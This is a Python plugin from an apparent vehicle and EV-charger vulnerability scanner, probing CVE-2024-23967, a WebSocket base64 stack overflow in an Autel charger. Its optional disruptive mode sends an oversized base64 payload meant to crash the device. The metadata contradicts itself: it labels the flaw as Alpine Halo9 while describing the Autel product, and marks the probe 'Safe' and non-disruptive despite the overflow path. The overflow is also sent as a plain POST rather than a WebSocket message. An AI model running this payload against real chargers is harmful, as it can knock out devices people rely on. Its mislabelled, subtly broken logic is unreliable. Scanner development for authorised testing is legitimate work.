#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
import base64
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 39,
    "cve": "CVE-2024-23967",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Alpine Halo9",
    "component": "车机服务/固件",
    "type": "输入校验或内存破坏",
    "summary": "Alpine Halo9 IVI攻击面相关缺陷，可用于本地/物理链式攻击。",
    "source_description": "Autel MaxiCharger AC Elite Business C50 WebSocket Base64 Decoding Stack-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Autel MaxiCharger AC Elite Business C50 chargers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed.\n\nThe specific flaw exists within the handling of base64-encoded data within WebSocket messages. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of the device.\n\nWas ZDI-CAN-23230",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23967",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-23967",
        "https://www.zerodayinitiative.com/advisories/ZDI-24-853/",
        "https://cveawg.mitre.org/api/cve/CVE-2024-23967"
    ],
    "affected": [
        {
            "vendor": "Autel",
            "product": "MaxiCharger AC Elite Business C50",
            "versions": [
                {
                    "version": "1.32.00",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-23967",
        "Alpine",
        "Halo9",
        "Autel",
        "MaxiCharger",
        "Elite",
        "Business",
        "WebSocket",
        "Base64",
        "Decoding",
        "Stack-based",
        "Buffer",
        "Overflow",
        "Remote",
        "Code",
        "Execution",
        "Vulnerability",
        "vulnerability",
        "network-adjacent",
        "attackers",
        "execute",
        "arbitrary",
        "code",
        "installations",
        "chargers",
        "Although",
        "MaxiCharger AC Elite Business C50"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-23967: Alpine Halo9/Autel WebSocket base64 stack overflow."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 80))
    tls = bool(params.get("tls", False))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or bool(params.get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2024-23967",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP/WebSocket behavioral probe - base64 stack overflow via oversized WebSocket payload",
    }

    active_port = None
    for try_port in [port, 80, 8080, 443]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    for ws_path in ["/ws", "/ocpp", "/charger", "/"]:
        r_ws = probe.request(
            "GET", ws_path,
            extra_headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                "Sec-WebSocket-Version": "13",
            }
        )
        evidence[f"ws_{ws_path.strip('/') or 'root'}_status"] = r_ws.get("status")
        resp_body = r_ws.get("body_text", "")
        if "websocket" in resp_body.lower() or r_ws.get("status") == 101:
            evidence["websocket_supported"] = True
            evidence["ws_path"] = ws_path
            break

    if allow_disruptive and evidence.get("websocket_supported"):
        oversized_b64 = base64.b64encode(b"B" * 65536).decode()
        payload = f'{{"type":"heartbeat","data":"{oversized_b64}"}}'.encode()
        r_overflow = probe.post(evidence.get("ws_path", "/ws"), payload, "application/json")
        evidence["overflow_post_status"] = r_overflow.get("status")
        if r_overflow.get("status") in (500, None) or r_overflow.get("error"):
            evidence["overflow_triggered"] = True
            return {
                "vulnerable": None,
                "evidence": evidence,
                "detection_confidence": detection_confidence("B", evidence, "base64_overflow_response"),
                "requires_manual_review": True,
            }

    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "websocket_service_probed"),
        "requires_manual_review": True,
    }

class Poc33CVE202423967InputValidationAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-033"
    meta_poc_name = 'CVE-2024-23967 输入校验或内存破坏 Active Validation'
    meta_cve_id = 'CVE-2024-23967'
    meta_severity = 'High'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-23967'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-23967']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "33_Alpine_Halo9_Input_Validation_Audit") if "VULN" in dir() else "33_Alpine_Halo9_Input_Validation_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc33CVE202423967InputValidationAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
